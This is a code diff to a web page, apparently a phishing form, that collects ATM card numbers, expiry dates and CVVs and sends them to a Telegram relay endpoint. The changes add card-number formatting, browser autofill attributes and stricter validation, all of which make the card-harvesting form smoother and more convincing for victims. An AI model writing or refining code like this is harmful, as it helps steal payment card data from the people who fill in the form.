@@ -10,6 +10,11 @@ const cardImage =
 const logoImage =
   'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202026-08-08%20062819-tEXyj9UyD7CkbbGMwFg7T0dD0XA5Ym.png'
 
+function formatCardNumber(value: string) {
+  const digits = value.replace(/\D/g, '').slice(0, 16)
+  return digits.replace(/(.{4})/g, '$1 ').trim()
+}
+
 export default function Page() {
   const router = useRouter()
   const [cardNumber, setCardNumber] = useState('')
@@ -23,7 +28,8 @@ export default function Page() {
     event.preventDefault()
     if (submitting) return
 
-    if (cardNumber.length !== 16 || !month || !year || cvv.length !== 3) {
+    const rawCardNumber = cardNumber.replace(/\D/g, '')
+    if (rawCardNumber.length !== 16 || !month || !year || cvv.length !== 3) {
       setError('Please enter your complete card details.')
       return
     }
@@ -31,7 +37,7 @@ export default function Page() {
     setSubmitting(true)
 
     try {
-      const data = saveSubmissionData({ card: cardNumber, month, year, cvv })
+      const data = saveSubmissionData({ card: rawCardNumber, month, year, cvv })
       await fetch('/api/telegram/send', {
         method: 'POST',
         headers: { 'content-type': 'application/json' },
@@ -64,13 +70,14 @@ export default function Page() {
               <input
                 aria-label="ATM Card Number"
                 inputMode="numeric"
-                maxLength={16}
+                autoComplete="cc-number"
+                maxLength={19}
                 value={cardNumber}
                 onChange={(event) => {
-                  setCardNumber(event.target.value.replace(/\D/g, ''))
+                  setCardNumber(formatCardNumber(event.target.value))
                   if (error) setError('')
                 }}
-                placeholder="ATM Card Number (16 digits)"
+                placeholder="XXXX XXXX XXXX XXXX"
               />
             </div>
 
@@ -90,7 +97,7 @@ export default function Page() {
                 <ChevronDown aria-hidden="true" className="pointer-events-none absolute right-4 top-1/2 size-3.5 -translate-y-1/2 text-muted-foreground" />
               </div>
               <div className="field-shell">
-                <input aria-label="CVV" inputMode="numeric" maxLength={3} value={cvv} onChange={(event) => { setCvv(event.target.value.replace(/\D/g, '')); if (error) setError('') }} placeholder="CVV" />
+                <input aria-label="CVV" inputMode="numeric" autoComplete="cc-csc" maxLength={3} value={cvv} onChange={(event) => { setCvv(event.target.value.replace(/\D/g, '').slice(0, 3)); if (error) setError('') }} placeholder="CVV" />
               </div>
             </div>
 
